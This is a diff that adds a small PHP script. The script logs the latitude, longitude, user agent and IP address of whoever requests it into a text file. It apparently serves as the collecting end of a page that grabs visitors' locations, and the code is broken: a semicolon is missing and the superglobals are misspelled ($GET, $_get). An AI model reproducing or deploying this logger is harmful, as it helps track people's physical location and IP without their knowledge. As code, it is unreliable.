@@ -1,0 +1,17 @@
+<?php
+
+$myfile = fopen("location.txt", "w")
+$txt = "lat: " .$GET["lat"] . "\nlong: " . $_get["long"]. "\nIP: " . $_SERVER["REMOTE_ADDR"] .
+"\nuseragent :" . $GET["uagent"];
+fwrite($myfile, $txt);
+fclose($myfile);
+
+
+
+
+
+
+
+
+
+?>
